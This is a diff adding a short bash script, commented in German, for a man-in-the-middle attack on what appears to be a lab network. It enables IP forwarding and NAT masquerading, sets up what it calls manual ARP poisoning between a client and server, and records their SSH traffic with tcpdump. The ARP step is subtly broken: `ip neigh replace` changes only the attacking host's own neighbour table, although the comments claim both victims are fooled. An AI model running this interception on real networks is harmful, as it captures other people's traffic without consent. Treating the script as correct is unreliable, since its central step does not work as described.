@@ -1,0 +1,37 @@
+#!/bin/bash
+
+CLIENT_IP=10.5.0.10
+SERVER_IP=10.5.0.30
+
+ATTACKER_MAC=$(cat /sys/class/net/eth0/address)
+
+echo "[MITM] Ich bin MAC: $ATTACKER_MAC"
+
+echo "[MITM] Aktiviere IP Forwarding..."
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+echo "[MITM] Setze NAT über nftables..."
+
+# NAT-Table anlegen
+nft add table ip nat 2>/dev/null
+
+# Postrouting-NAT-Regel
+nft add chain ip nat POSTROUTING '{ type nat hook postrouting priority 100 ; }' 2>/dev/null
+
+# Masquerading aktivieren
+nft add rule ip nat POSTROUTING oif "eth0" masquerade
+
+echo "[MITM] NAT aktiv."
+
+echo "[MITM] Starte ARP-Poisoning (manuell)..."
+
+# ARP Fake: Client -> denkt Server = Attacker
+ip neigh replace $SERVER_IP lladdr $ATTACKER_MAC nud permanent dev eth0
+
+# ARP Fake: Server -> denkt Client = Attacker
+ip neigh replace $CLIENT_IP lladdr $ATTACKER_MAC nud permanent dev eth0
+
+echo "[MITM] ARP-Poisoning aktiv."
+
+echo "[MITM] Starte tcpdump..."
+tcpdump -i eth0 -w ssh.pcap 'tcp port 22'
